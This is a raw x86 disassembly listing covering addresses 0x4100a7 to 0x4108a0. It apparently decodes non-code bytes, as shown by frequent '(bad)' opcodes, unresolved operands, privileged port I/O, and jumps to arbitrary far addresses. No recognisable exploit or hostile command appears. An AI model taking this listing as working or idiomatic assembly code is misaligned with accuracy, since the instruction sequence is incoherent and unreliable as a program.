  4100a7:	in     al,dx
  4100a8:	loop   0x41006e
  4100aa:	xor    al,0xd9
  4100ac:	pushf  
  4100ad:	mov    dl,BYTE PTR [ebp+0x51d8e692]
  4100b3:	mov    dh,0x95
  4100b5:	jmp    0x4013:0xc1a8ae07
  4100bc:	loopne 0x41006f
  4100be:	pop    ss
  4100bf:	mov    ch,0xdd
  4100c1:	mov    eax,ds:0x63853e54
  4100c6:	aam    0xea
  4100c8:	pushf  
  4100c9:	jne    0x410094
  4100cb:	call   0xa179:0x1e1b
  4100d1:	mov    ds:0xac8919d9,eax
  4100d6:	neg    BYTE PTR [esi+0x6acb8274]
  4100dc:	in     eax,0xa8
  4100de:	fisttp WORD PTR [esi+edi*2+0x5a6545b2]
  4100e5:	sar    ch,1
  4100e7:	and    cl,BYTE PTR [edx+0x10]
  4100ea:	nop
  4100eb:	(bad)  [edx+0x73407ba0]
  4100f1:	mov    ebp,edi
  4100f3:	dec    ecx
  4100f4:	inc    esp
  4100f5:	push   ebx
  4100f6:	xchg   DWORD PTR [eax-0x74],esi
  4100f9:	sub    al,0xa1
  4100fb:	cmp    eax,0xedb7caf8
  410100:	and    DWORD PTR [ebp+edx*2-0x3a10b29a],ecx
  410107:	mov    ds:0xb7008fcf,eax
  41010c:	or     BYTE PTR [esi-0x3ff7f382],bh
  410112:	rol    DWORD PTR [esi-0x14],cl
  410115:	pop    edx
  410116:	cmp    al,0x7a
  410118:	sahf   
  410119:	pop    eax
  41011a:	jb     0x410161
  41011c:	jge    0x4100eb
  41011e:	mov    dl,0x67
  410120:	data16 int3 
  410122:	and    eax,0xd201f624
  410127:	test   BYTE PTR [ecx-0xb],al
  41012a:	pop    DWORD PTR ds:0x26d26235
  410130:	push   ecx
  410131:	pop    ecx
  410132:	adc    al,0x4b
  410134:	retf   0x949c
  410137:	js     0x410164
  410139:	fwait
  41013a:	jbe    0x4101b6
  41013c:	lods   al,BYTE PTR ds:[esi]
  41013d:	dec    eax
  41013e:	pusha  
  41013f:	imul   ebp,DWORD PTR [ebp+0x11],0xffffffb6
  410143:	push   edx
  410144:	jae    0x410122
  410146:	clc    
  410147:	scas   eax,DWORD PTR es:[edi]
  410148:	jno    0x41012d
  41014a:	aam    0x81
  41014c:	or     DWORD PTR [edi],esi
  41014e:	sub    DWORD PTR [ebx+edx*2-0x1c3063f7],edi
  410155:	xor    eax,0xaa717d82
  41015a:	and    BYTE PTR [edx-0x73],ch
  41015d:	popf   
  41015e:	int3   
  41015f:	ins    BYTE PTR es:[edi],dx
  410160:	icebp  
  410161:	hlt    
  410162:	faddp  st(2),st
  410164:	les    ecx,FWORD PTR [esi+ebx*2-0x584debe4]
  41016b:	inc    ebx
  41016c:	imul   esp,DWORD PTR [edi],0xb
  41016f:	cmp    al,0xb8
  410171:	dec    ebp
  410172:	out    0x19,eax
  410174:	mov    al,0xbd
  410176:	shr    DWORD PTR [ecx+0x2e6ff15b],0x43
  41017d:	cmp    BYTE PTR fs:[edx-0x1a120219],cl
  410184:	cmp    ebp,esp
  410186:	jp     0x4101d0
  410188:	dec    edi
  410189:	pop    eax
  41018a:	dec    esp
  41018b:	ret    0x27fd
  41018e:	test   al,0xd1
  410190:	lea    esi,[ebp-0x685b2b77]
  410196:	cdq    
  410197:	shl    BYTE PTR [ebx+0x0],cl
  41019a:	jo     0x410165
  41019c:	push   es
  41019d:	xchg   ecx,eax
  41019e:	sbb    eax,0x215c54bb
  4101a3:	dec    edx
  4101a4:	cmp    DWORD PTR [ebp-0x278325c5],0x77ca0d84
  4101ae:	out    dx,al
  4101af:	mov    BYTE PTR [esp+edi*4+0x5e3ea354],dl
  4101b6:	dec    esp
  4101b7:	add    eax,0x80b804ea
  4101bc:	mov    eax,ds:0x99223cd6
  4101c1:	adc    cl,0x20
  4101c4:	cdq    
  4101c5:	xchg   dh,bh
  4101c7:	pop    ebp
  4101c8:	mov    esi,0x18eb6703
  4101cd:	out    0xf0,al
  4101cf:	pop    edi
  4101d0:	nop
  4101d1:	cmc    
  4101d2:	test   al,0xc
  4101d4:	cmp    DWORD PTR [ebp+ecx*4-0x5a],edx
  4101d8:	not    DWORD PTR [eax+0x259ba2e6]
  4101de:	pop    ebp
  4101df:	sbb    edx,DWORD PTR [ebp-0x16]
  4101e2:	inc    esp
  4101e3:	xor    DWORD PTR [ecx+0x617078d],ebp
  4101e9:	push   0xfffffff2
  4101eb:	ins    DWORD PTR es:[edi],dx
  4101ec:	sbb    DWORD PTR [edi+0xd],esp
  4101ef:	jo     0x410223
  4101f1:	inc    esi
  4101f2:	retf   
  4101f3:	lea    edx,[esi+0x45]
  4101f6:	jmp    0x4f3b9c22
  4101fb:	mov    ah,0x59
  4101fd:	jp     0x410194
  4101ff:	mov    fs,WORD PTR [edx+0x1c7f41fe]
  410205:	push   0x393ec960
  41020a:	push   esp
  41020b:	adc    dl,BYTE PTR [ebx+0x183d3ff7]
  410211:	ret    0x41b4
  410214:	test   DWORD PTR [edi],ebx
  410216:	fwait
  410217:	(bad)  
  410218:	into   
  410219:	(bad)  
  41021a:	jmp    0xff1c0cc
  41021f:	outs   dx,DWORD PTR ds:[esi]
  410220:	mov    eax,0x3a189505
  410225:	nop
  410226:	xlat   BYTE PTR ds:[ebx]
  410227:	jg     0x41029a
  410229:	sbb    ebx,DWORD PTR [edx]
  41022b:	dec    ebx
  41022c:	mov    BYTE PTR [ebx+0x24],0xfb
  410230:	scas   al,BYTE PTR es:[edi]
  410231:	inc    esi
  410232:	imul   edi,DWORD PTR [ecx],0x5969d883
  410238:	imul   ebp,eax,0x73
  41023b:	(bad)  
  41023c:	sahf   
  41023d:	and    DWORD PTR [esi-0x67],edi
  410240:	push   edx
  410241:	lock sbb DWORD PTR [eax],0xffffffca
  410245:	repz xor eax,0xbc7e7d8a
  41024b:	leave  
  41024c:	push   eax
  41024d:	lods   eax,DWORD PTR ds:[esi]
  41024e:	push   cs
  41024f:	int3   
  410250:	fs push cs
  410252:	mov    bh,0xee
  410254:	mov    WORD PTR [ebx-0x47],?
  410257:	cmp    BYTE PTR [ebx-0x220eb9fd],ch
  41025d:	lock push ebx
  41025f:	mov    edx,0xfac61fd9
  410264:	rcr    BYTE PTR [ecx],1
  410266:	push   cs
  410267:	jp     0x41020c
  410269:	pop    ebx
  41026a:	xor    ah,BYTE PTR [esi-0x71a8e40c]
  410270:	add    BYTE PTR [ebp-0x61],cl
  410273:	das    
  410274:	(bad)  
  410275:	icebp  
  410276:	stc    
  410277:	scas   al,BYTE PTR es:[edi]
  410278:	jnp    0x41023b
  41027a:	clc    
  41027b:	es and esi,ecx
  41027e:	jnp    0x410225
  410280:	xchg   BYTE PTR [edi+0x34d1da8b],dl
  410286:	mov    al,ds:0xb794223c
  41028b:	adc    eax,DWORD PTR [ebx]
  41028d:	ja     0x410247
  41028f:	dec    esi
  410290:	repz push eax
  410292:	cs dec edx
  410294:	and    DWORD PTR [esi+0x7],edx
  410297:	inc    ebx
  410298:	or     ebp,DWORD PTR [esi+0x45]
  41029b:	lods   al,BYTE PTR ds:[esi]
  41029c:	stc    
  41029d:	popf   
  41029e:	add    al,0x87
  4102a0:	ss push esi
  4102a2:	mov    dh,0x3e
  4102a4:	(bad)  
  4102a5:	std    
  4102a6:	arpl   WORD PTR [edx+0xd],cx
  4102a9:	or     bh,dl
  4102ab:	clc    
  4102ac:	rol    eax,cl
  4102ae:	mov    esp,0x310a5f58
  4102b3:	inc    edx
  4102b4:	int    0xa
  4102b6:	das    
  4102b7:	pushf  
  4102b8:	repnz mov DWORD PTR [ebx+ebp*1-0x7f],ebp
  4102bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102be:	inc    esp
  4102bf:	loope  0x410269
  4102c1:	and    BYTE PTR [edx-0x6c],al
  4102c4:	mov    cl,0x7
  4102c6:	fisub  DWORD PTR [ecx+eiz*2-0x53]
  4102ca:	or     bl,BYTE PTR [esi]
  4102cc:	xchg   BYTE PTR [edi+0x57],dh
  4102cf:	add    eax,0x6156157e
  4102d4:	mov    cl,0xdf
  4102d6:	add    bl,BYTE PTR [ecx-0x15339dd7]
  4102dc:	jo     0x410280
  4102de:	imul   edx,DWORD PTR [edi-0xd],0xd
  4102e2:	add    al,0xfa
  4102e4:	push   0xf1b76aa5
  4102e9:	adc    DWORD PTR [ebp-0xa],esp
  4102ec:	push   ds
  4102ed:	stos   BYTE PTR es:[edi],al
  4102ee:	fcom   QWORD PTR [ebx-0x35055857]
  4102f4:	add    DWORD PTR [esi+0x75],esi
  4102f7:	mov    dh,BYTE PTR [edi]
  4102f9:	pop    edi
  4102fa:	pop    es
  4102fb:	add    al,0x83
  4102fd:	inc    esp
  4102fe:	push   0x6285d18a
  410303:	(bad)  
  410304:	xchg   esp,eax
  410305:	add    eax,0xd25fed16
  41030a:	imul   edi,DWORD PTR [eax+0x1195b55f],0x442f01c7
  410314:	mov    esi,0x41990003
  410319:	and    ah,BYTE PTR [edi-0x4e9c3a56]
  41031f:	pop    edx
  410320:	inc    edi
  410321:	sahf   
  410322:	repnz gs mov esp,0x120380b5
  410329:	sub    ah,BYTE PTR [ebp+0x6406cd54]
  41032f:	and    DWORD PTR [ebx+0x7f5c8cab],ebx
  410335:	aaa    
  410336:	add    dh,cl
  410338:	lods   al,BYTE PTR ds:[esi]
  410339:	jns    0x410321
  41033b:	dec    ebx
  41033c:	out    0x97,eax
  41033e:	not    DWORD PTR [edx]
  410340:	jae    0x410396
  410342:	dec    esp
  410343:	jmp    0xeade:0x2878de68
  41034a:	jbe    0x4103a9
  41034c:	ret    
  41034d:	je     0x41032c
  41034f:	dec    ebx
  410350:	push   ss
  410351:	aas    
  410352:	mov    edi,0x82cac9fd
  410357:	xchg   ebx,eax
  410358:	bound  ebp,QWORD PTR [edi+0x62da2ff2]
  41035e:	outs   dx,BYTE PTR ds:[esi]
  41035f:	dec    ebx
  410360:	fnsave [ebx+0x2e]
  410363:	push   eax
  410364:	and    ecx,DWORD PTR [eax+ebp*8+0x2acec8ae]
  41036b:	loop   0x410319
  41036d:	add    bl,BYTE PTR [esi]
  41036f:	dec    ecx
  410370:	retf   
  410371:	push   0x6837c6d1
  410376:	ins    DWORD PTR es:[edi],dx
  410377:	cmp    BYTE PTR [ebp+0x181aa38f],al
  41037d:	ja     0x41035d
  41037f:	jg     0x410308
  410381:	jge    0x410400
  410383:	xchg   ebp,eax
  410384:	and    eax,0xf3c40f33
  410389:	ret    
  41038a:	cmp    al,0xdd
  41038c:	(bad)  
  41038d:	clc    
  41038e:	dec    esp
  41038f:	add    DWORD PTR [esp+ebp*4],edi
  410392:	repz xchg edi,eax
  410394:	(bad)  
  410395:	adc    al,0x71
  410397:	mov    esi,0xd47f22bf
  41039c:	adc    eax,0xda9032cf
  4103a1:	jno    0x410411
  4103a3:	daa    
  4103a4:	sti    
  4103a5:	shl    bl,0xd
  4103a8:	aam    0x2b
  4103aa:	xchg   BYTE PTR ds:0x2bfe31b0,dl
  4103b0:	push   cs
  4103b1:	enter  0x8c47,0x5d
  4103b5:	jg     0x4103c2
  4103b7:	(bad)  
  4103b8:	sub    eax,0x8288a6a3
  4103bd:	iret   
  4103be:	jns    0x410415
  4103c0:	jno    0x410360
  4103c2:	je     0x410344
  4103c4:	das    
  4103c5:	fcomp  st(4)
  4103c7:	push   es
  4103c8:	push   es
  4103c9:	dec    edx
  4103ca:	(bad)  
  4103cb:	iret   
  4103cc:	test   BYTE PTR [eax],dh
  4103ce:	(bad)
  4103d2:	hlt    
  4103d3:	(bad)  
  4103d4:	fsubr  QWORD PTR [edi]
  4103d6:	fcomp  QWORD PTR [esi]
  4103d8:	iret   
  4103d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103da:	cmp    eax,0x95f313c6
  4103df:	pop    es
  4103e0:	inc    esp
  4103e1:	mov    bh,BYTE PTR [eax]
  4103e3:	cmp    DWORD PTR [eax-0x3fb9cbab],0xe69eea58
  4103ed:	fild   WORD PTR [eax-0x7460561d]
  4103f3:	pop    edx
  4103f4:	dec    ecx
  4103f5:	inc    esp
  4103f6:	pop    ebx
  4103f7:	ja     0x4103f1
  4103f9:	(bad)  
  4103fb:	leave  
  4103fc:	cmp    ch,bh
  4103fe:	ror    BYTE PTR [ecx-0x74a98d72],cl
  410404:	cmp    eax,0x7cb08f47
  410409:	into   
  41040a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41040b:	imul   DWORD PTR [esi*1+0x4b7beeb1]
  410412:	dec    ecx
  410413:	push   cs
  410414:	sub    BYTE PTR [esi+0x3a],bl
  410417:	loop   0x4103a9
  410419:	and    bh,dl
  41041b:	push   es
  41041c:	in     eax,dx
  41041d:	mov    eax,ds:0xa58ce039
  410422:	inc    esp
  410423:	xor    esp,esp
  410425:	out    0x62,eax
  410427:	add    DWORD PTR [edx-0x707d3a9e],ecx
  41042d:	pop    esp
  41042e:	inc    esi
  41042f:	pop    esp
  410430:	mov    edx,0xcff1614e
  410435:	push   cs
  410436:	outs   dx,BYTE PTR ds:[esi]
  410437:	and    al,0x5d
  410439:	pop    edx
  41043a:	popa   
  41043b:	mov    esi,0x8dc605c6
  410440:	or     al,0xd2
  410442:	jae    0x41043c
  410444:	std    
  410445:	sbb    al,0x40
  410447:	jp     0x410465
  410449:	pop    ecx
  41044a:	mov    dl,0xb0
  41044c:	xchg   esi,eax
  41044d:	mov    eax,ds:0xf9fb2449
  410452:	jmp    0x41042a
  410454:	stos   DWORD PTR es:[edi],eax
  410455:	mov    dl,0x18
  410457:	push   edi
  410458:	or     BYTE PTR [esi+esi*1-0x5d],dl
  41045c:	aam    0x81
  41045e:	inc    esi
  41045f:	scas   eax,DWORD PTR es:[edi]
  410460:	imul   edx,DWORD PTR [edi],0x3a
  410463:	fmul   DWORD PTR [edi+ebp*1]
  410466:	xor    BYTE PTR [edx+0x1b],0xdd
  41046a:	push   0xfffffffc
  41046c:	jecxz  0x41045a
  41046e:	mov    cl,0x5
  410470:	in     eax,dx
  410471:	xor    ah,ah
  410473:	adc    eax,0xec66c897
  410478:	xchg   esi,eax
  410479:	rcr    esp,1
  41047b:	xchg   ebp,eax
  41047c:	mov    dl,BYTE PTR [ecx-0xa]
  41047f:	iret   
  410480:	or     BYTE PTR ss:[ebx+0x31],0x58
  410485:	mov    eax,ds:0x38e6ca57
  41048a:	(bad)  
  41048b:	cli    
  41048c:	mov    ah,0x76
  41048e:	xor    eax,0xef60240b
  410493:	mov    eax,ds:0x850709ad
  410498:	aad    0xec
  41049a:	sahf   
  41049b:	jno    0x4104b7
  41049d:	xor    edi,esi
  41049f:	push   ss
  4104a0:	enter  0x4882,0x50
  4104a4:	aam    0xd4
  4104a6:	cmp    dl,0xfb
  4104a9:	das    
  4104aa:	les    edi,FWORD PTR fs:[edx-0xfa6ffb8]
  4104b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104b2:	adc    BYTE PTR [ebp-0x5dfdd29c],0xd2
  4104b9:	js     0x41046a
  4104bb:	and    cl,BYTE PTR [eax+0x4f]
  4104be:	or     al,0x46
  4104c0:	int    0x3
  4104c2:	mov    edx,0x766d92ae
  4104c7:	mov    edi,0xf6a1817d
  4104cc:	gs lock mov ecx,0x1eb209c9
  4104d3:	(bad)
  4104d6:	mov    eax,ds:0xc70dae96
  4104db:	(bad)  
  4104dc:	pop    ds
  4104dd:	ret    0x6817
  4104e0:	in     eax,dx
  4104e1:	push   esi
  4104e2:	dec    esp
  4104e3:	popa   
  4104e4:	outs   dx,DWORD PTR ds:[esi]
  4104e5:	out    0x8,al
  4104e7:	loopne 0x410480
  4104e9:	shr    DWORD PTR [eax+0x39b0b145],1
  4104ef:	cmp    BYTE PTR [ebx],0xd1
  4104f2:	sbb    DWORD PTR [esi+0xf],ecx
  4104f5:	aad    0x7c
  4104f7:	jg     0x410526
  4104f9:	mov    ebx,0x4ca4622d
  4104fe:	test   al,0x34
  410500:	stos   DWORD PTR es:[edi],eax
  410501:	aad    0x51
  410503:	loope  0x41050e
  410505:	inc    esi
  410506:	xchg   esi,eax
  410507:	inc    eax
  410508:	sbb    al,dl
  41050a:	rol    DWORD PTR [edi+0xc708a72],cl
  410510:	dec    eax
  410511:	inc    esp
  410512:	pop    esp
  410513:	dec    edi
  410514:	inc    eax
  410515:	push   cs
  410516:	mov    bh,0x9d
  410518:	push   esp
  410519:	sub    DWORD PTR [ebp+eiz*2+0xf],edi
  41051d:	sub    al,0xd0
  41051f:	push   es
  410520:	pop    edi
  410521:	icebp  
  410522:	pop    ebp
  410523:	jl     0x41057e
  410525:	dec    edi
  410526:	sub    al,0x3f
  410528:	lahf   
  410529:	pop    es
  41052a:	outs   dx,DWORD PTR ds:[esi]
  41052b:	or     eax,0x9988faa2
  410530:	stc    
  410531:	sub    bl,BYTE PTR [esi+0x2139385]
  410537:	push   esi
  410538:	imul   ecx,DWORD PTR [ecx-0x5e18d1ee],0x4a
  41053f:	pop    ebp
  410540:	and    DWORD PTR [esi-0x31c50de3],ecx
  410546:	(bad)  [esi-0x47]
  410549:	ins    BYTE PTR es:[edi],dx
  41054a:	cwde   
  41054b:	push   edi
  41054c:	cli    
  41054d:	mov    ebp,0x419483d6
  410552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410553:	inc    edx
  410554:	dec    ebp
  410555:	cmp    DWORD PTR [edx],esp
  410557:	inc    ebx
  410558:	in     eax,0xa0
  41055a:	pop    eax
  41055b:	cs pop edi
  41055d:	sub    edx,DWORD PTR [eax+ebx*4+0x3f7e3911]
  410564:	pop    esi
  410565:	mov    dh,0x7f
  410567:	add    ebp,DWORD PTR [esi-0x5353ef1a]
  41056d:	mov    ah,0xb9
  41056f:	jo     0x410547
  410571:	into   
  410572:	aaa    
  410573:	jne    0x4104fd
  410575:	ins    BYTE PTR es:[edi],dx
  410576:	mov    ds:0xab3d1fd9,al
  41057b:	dec    ebx
  41057c:	dec    eax
  41057d:	adc    BYTE PTR [edx-0x3e],dl
  410580:	(bad)
  410584:	xchg   edi,eax
  410585:	mov    WORD PTR [esi+ebx*1],?
  410588:	pop    eax
  410589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058a:	out    0x65,al
  41058c:	in     al,dx
  41058d:	loop   0x410531
  41058f:	push   0xa5a58092
  410594:	adc    BYTE PTR [esi+0x6e],bl
  410597:	cmp    edi,DWORD PTR [eax+ebp*1]
  41059a:	popf   
  41059b:	or     BYTE PTR [edx+ebx*2+0x261461a8],bl
  4105a2:	test   DWORD PTR [ecx-0xc],0x1bec1e3b
  4105a9:	or     bl,BYTE PTR [ebx+0x70]
  4105ac:	(bad)  
  4105ad:	dec    edi
  4105ae:	xchg   ebp,eax
  4105af:	cmp    edi,DWORD PTR [ebp+0x4d]
  4105b2:	sbb    al,0x2b
  4105b4:	push   esp
  4105b5:	ins    DWORD PTR es:[edi],dx
  4105b6:	sti    
  4105b7:	mov    ?,esi
  4105b9:	lds    esp,FWORD PTR [ecx-0x78]
  4105bc:	in     eax,dx
  4105bd:	(bad)  
  4105bf:	or     eax,DWORD PTR [edi+0x2c]
  4105c2:	nop
  4105c3:	bound  esp,QWORD PTR [edi+0x50]
  4105c6:	or     esp,DWORD PTR ds:0x38a0381b
  4105cc:	sbb    BYTE PTR [edx+0x3],dl
  4105cf:	das    
  4105d0:	dec    ebx
  4105d1:	out    dx,eax
  4105d2:	xchg   ebx,eax
  4105d3:	shr    DWORD PTR [esi],cl
  4105d5:	icebp  
  4105d6:	or     BYTE PTR [edx+0xa9ba90d],ch
  4105dc:	xor    bh,BYTE PTR [ecx+0x482e3066]
  4105e2:	loope  0x4105a5
  4105e4:	jns    0x4105d5
  4105e6:	cmp    eax,0x4b258cd3
  4105eb:	frstpm(287 only) 
  4105ed:	mov    esi,edi
  4105ef:	mov    bl,0x67
  4105f1:	and    esp,esi
  4105f3:	in     eax,0x55
  4105f5:	cmp    BYTE PTR [ebx-0x30ad36ad],bh
  4105fb:	sbb    al,0x9c
  4105fd:	enter  0xa291,0x79
  410601:	mov    edi,0x1fc6892e
  410606:	rol    cl,0xa4
  410609:	fistp  WORD PTR [esi]
  41060b:	and    dl,ah
  41060d:	cmp    bh,dh
  41060f:	aaa    
  410610:	(bad)  
  410611:	(bad)  [ebp+eax*2+0x4a]
  410615:	leave  
  410616:	sbb    eax,0x768dcc18
  41061b:	popf   
  41061c:	mov    WORD PTR [esi+eiz*8-0xc],?
  410620:	lea    esp,[esi-0x3b]
  410623:	sbb    esp,esi
  410625:	aaa    
  410626:	fist   WORD PTR [edx+0x604e6202]
  41062c:	cwde   
  41062d:	push   0x377a9100
  410632:	xlat   BYTE PTR ds:[ebx]
  410633:	push   0xffffffaf
  410635:	add    ebx,DWORD PTR [ecx-0x28dcae6b]
  41063b:	jg     0x410608
  41063d:	or     BYTE PTR [esi-0x7e],al
  410640:	repnz add eax,0xdfffaee8
  410646:	div    BYTE PTR [edx]
  410648:	mov    dl,0xab
  41064a:	pop    edx
  41064b:	add    ebp,DWORD PTR [ebx-0x4b]
  41064e:	gs xchg ebp,eax
  410650:	push   edx
  410651:	mov    bl,0x66
  410653:	int    0xee
  410655:	fisttp WORD PTR [esi-0x2]
  410658:	out    dx,al
  410659:	inc    esi
  41065a:	pop    ebp
  41065b:	push   ecx
  41065c:	mov    edi,0x768139e7
  410661:	and    al,0x79
  410663:	fsub   st,st(0)
  410665:	outs   dx,BYTE PTR ds:[esi]
  410666:	cmp    ecx,DWORD PTR [ebp+0x2a]
  410669:	out    0x8f,al
  41066b:	adc    eax,0xc4e3574d
  410670:	jge    0x4106c5
  410672:	scas   al,BYTE PTR es:[edi]
  410673:	pop    ecx
  410674:	lods   al,BYTE PTR ds:[esi]
  410675:	jmp    0x13ec:0x93fadf46
  41067c:	jmp    0x4106eb
  41067e:	jo     0x41068e
  410680:	pusha  
  410681:	cs ss scas eax,DWORD PTR es:[edi]
  410684:	add    eax,0xef8c9f86
  410689:	in     eax,0xc3
  41068b:	sahf   
  41068c:	mov    ebp,0xf126c4f3
  410691:	and    cl,BYTE PTR [edi]
  410693:	dec    ebx
  410694:	push   ebx
  410695:	jecxz  0x410664
  410697:	push   edi
  410698:	imul   ecx,edi,0x6acf4fe3
  41069e:	push   ss
  41069f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106a0:	dec    eax
  4106a1:	sbb    DWORD PTR [ecx+0x6f],ebx
  4106a4:	aam    0xc3
  4106a6:	out    dx,al
  4106a7:	iret   
  4106a8:	call   FWORD PTR [ecx]
  4106aa:	inc    ebx
  4106ab:	or     eax,0x69222a09
  4106b0:	inc    edx
  4106b1:	aaa    
  4106b2:	fiadd  DWORD PTR [esi+eax*2-0x2]
  4106b6:	repz aam 0xc5
  4106b9:	loop   0x410694
  4106bb:	mov    ch,0x9d
  4106bd:	jno    0x410709
  4106bf:	(bad)  
  4106c1:	lods   eax,DWORD PTR ds:[esi]
  4106c2:	test   eax,0xf3d7aa9a
  4106c7:	cld    
  4106c8:	push   es
  4106c9:	gs and edx,esp
  4106cc:	xchg   edx,eax
  4106cd:	outs   dx,BYTE PTR ds:[esi]
  4106ce:	inc    edi
  4106cf:	arpl   WORD PTR [edx],bx
  4106d1:	mov    ecx,0xfb440ad4
  4106d6:	mov    esi,0xdd24a716
  4106db:	cld    
  4106dc:	add    edx,DWORD PTR [ebp-0x6163cb25]
  4106e2:	lds    edx,FWORD PTR [edx]
  4106e4:	popf   
  4106e5:	mov    ?,WORD PTR fs:[edx+0x67]
  4106e9:	mov    al,ds:0xaa67699
  4106ee:	cdq    
  4106ef:	mov    BYTE PTR [edx+0x27e64075],ah
  4106f5:	cmp    al,0x89
  4106f7:	pop    edi
  4106f8:	sti    
  4106f9:	fucomip st,st(6)
  4106fb:	(bad)  
  4106fc:	pop    edi
  4106fd:	xchg   ebp,eax
  4106fe:	push   edi
  4106ff:	pop    es
  410700:	push   ds
  410701:	fucom  st(0)
  410703:	(bad)  
  410704:	in     al,0x37
  410706:	cs mov esi,0xa419fd7d
  41070c:	pop    es
  41070d:	out    dx,al
  41070e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41070f:	mov    ebx,0xbd7fcaae
  410714:	pusha  
  410715:	fidiv  WORD PTR [ebx-0x26ec6752]
  41071b:	xchg   ebp,eax
  41071c:	inc    esi
  41071d:	or     DWORD PTR [eax+0x169b375f],ebp
  410723:	dec    edi
  410724:	add    DWORD PTR [eax],esi
  410726:	add    al,0xce
  410728:	gs fwait
  41072a:	fwait
  41072b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41072c:	or     BYTE PTR cs:0x8d34091,ch
  410733:	test   DWORD PTR [ebp-0x1f],ecx
  410736:	xchg   DWORD PTR [eax+0x1f9ca973],ecx
  41073c:	js     0x4106e5
  41073e:	sbb    BYTE PTR [edx],bh
  410740:	std    
  410741:	xor    BYTE PTR [ecx],0x8f
  410744:	adc    al,bh
  410746:	sbb    bh,bl
  410748:	in     eax,0xc5
  41074a:	xor    BYTE PTR [edi],cl
  41074c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41074d:	test   al,0x54
  41074f:	jle    0x410768
  410751:	iret   
  410752:	and    ebx,DWORD PTR [edx+0x63]
  410755:	jmp    0x410718
  410757:	cmc    
  410758:	sbb    eax,0x1fe0dd47
  41075d:	loopne 0x410703
  41075f:	or     eax,0x14f20e81
  410764:	iret   
  410765:	xchg   ebp,ebx
  410767:	pop    edx
  410768:	shl    DWORD PTR ds:0x138fc4fb,1
  41076e:	push   ebx
  41076f:	nop
  410770:	loop   0x4107b8
  410772:	les    ecx,FWORD PTR [edx*4+0x28d637ba]
  410779:	cwde   
  41077a:	mov    dl,0x89
  41077c:	mov    ecx,ebx
  41077e:	shr    BYTE PTR [ecx+0x56],0x7d
  410782:	pop    ss
  410783:	out    0xfe,al
  410785:	(bad)  
  410786:	sar    BYTE PTR [ebx+0x290d87ba],cl
  41078c:	sbb    al,0x3a
  41078e:	clc    
  41078f:	or     eax,0x82eb801
  410794:	popf   
  410795:	push   esi
  410796:	pop    es
  410797:	sahf   
  410798:	fisttp QWORD PTR [ebp+0x6a]
  41079b:	into   
  41079c:	and    BYTE PTR [ebp+0x35b4bdbc],ah
  4107a2:	pushf  
  4107a3:	jecxz  0x410791
  4107a5:	mov    eax,0x75a14e0e
  4107aa:	loop   0x410761
  4107ac:	int    0x28
  4107ae:	ret    0xcc3c
  4107b1:	adc    BYTE PTR [esi+0x61],dh
  4107b4:	repnz pop ecx
  4107b6:	out    dx,eax
  4107b7:	and    al,0xc7
  4107b9:	mov    DWORD PTR fs:[edi-0x68],edi
  4107bd:	inc    ebx
  4107be:	gs adc esi,0x7f
  4107c2:	sbb    esi,DWORD PTR [esp+eax*2]
  4107c5:	add    BYTE PTR [edi-0x6d0aed78],dh
  4107cb:	mov    esp,0x7f5122e1
  4107d0:	pop    es
  4107d1:	cwde   
  4107d2:	jmp    DWORD PTR [ecx]
  4107d4:	bound  ebp,QWORD PTR [ebp+0x51]
  4107d7:	mov    ebp,0x367bae44
  4107dc:	adc    DWORD PTR ds:0x86a2ecfc,esi
  4107e2:	xor    ch,BYTE PTR ds:0xa8b4aa92
  4107e8:	sbb    DWORD PTR ss:0x9e3e0407,esi
  4107ef:	sbb    al,0x5d
  4107f1:	mov    ebx,0x8b81eaf4
  4107f6:	add    dh,ch
  4107f8:	xchg   edx,eax
  4107f9:	mov    edx,0xe7d9a6fa
  4107fe:	sub    eax,0x15ea870d
  410803:	fcmovnb st,st(2)
  410805:	out    0xe1,eax
  410807:	imul   esi,DWORD PTR [edx-0x3e484638],0xffffff9a
  41080e:	outs   dx,BYTE PTR cs:[esi]
  410810:	es jmp 0x41081a
  410813:	pusha  
  410814:	push   eax
  410815:	stos   DWORD PTR es:[edi],eax
  410816:	fmul   st(4),st
  410818:	dec    edx
  410819:	aam    0x28
  41081b:	aas    
  41081c:	inc    eax
  41081d:	popf   
  41081e:	and    edi,esp
  410820:	(bad)  
  410821:	ja     0x41089b
  410823:	push   ecx
  410824:	mov    cl,BYTE PTR [edi+0x54]
  410827:	(bad)  
  410828:	(bad)  
  410829:	idiv   DWORD PTR [edi-0x20e39836]
  41082f:	clc    
  410830:	xchg   ebx,eax
  410831:	ror    bh,1
  410833:	leave  
  410834:	push   ecx
  410835:	xchg   esi,eax
  410836:	mov    ah,0x93
  410838:	jp     0x4108a4
  41083a:	sbb    eax,0x579d65aa
  41083f:	mov    al,ds:0x5a2eb83a
  410844:	and    eax,0xd8c918ac
  410849:	jmp    0x5496e953
  41084e:	std    
  41084f:	xor    eax,0xa5d2a931
  410854:	pop    eax
  410855:	shl    BYTE PTR [ebx+0x56e796ae],cl
  41085b:	test   al,0x11
  41085d:	repz xor BYTE PTR [esi+ebp*8-0x4c],ah
  410862:	(bad)  
  410863:	mov    cl,0x91
  410865:	mov    ebx,DWORD PTR ss:[ebp-0x66bd5c50]
  41086c:	aam    0x31
  41086e:	and    DWORD PTR ds:0xbebae0c2,esp
  410874:	add    DWORD PTR [eax+eax*1-0x982b94d],esp
  41087b:	imul   esp,esp,0xffffffb2
  41087e:	int3   
  41087f:	pop    edi
  410880:	in     eax,dx
  410881:	mov    BYTE PTR [edx+0x6a],cl
  410884:	mov    bl,0xd3
  410886:	mov    eax,0xc5d5ee2d
  41088b:	jbe    0x4108a9
  41088d:	xchg   DWORD PTR [edi],ebx
  41088f:	xor    eax,0xfd608c35
  410894:	out    0x75,al
  410896:	jb     0x41086d
  410898:	out    dx,al
  410899:	fimul  DWORD PTR [esp+eax*2+0x64]
  41089d:	daa    
  41089e:	jae    0x410857
  4108a0:	xchg   DWORD PTR [eax+0x48557a6d],esi
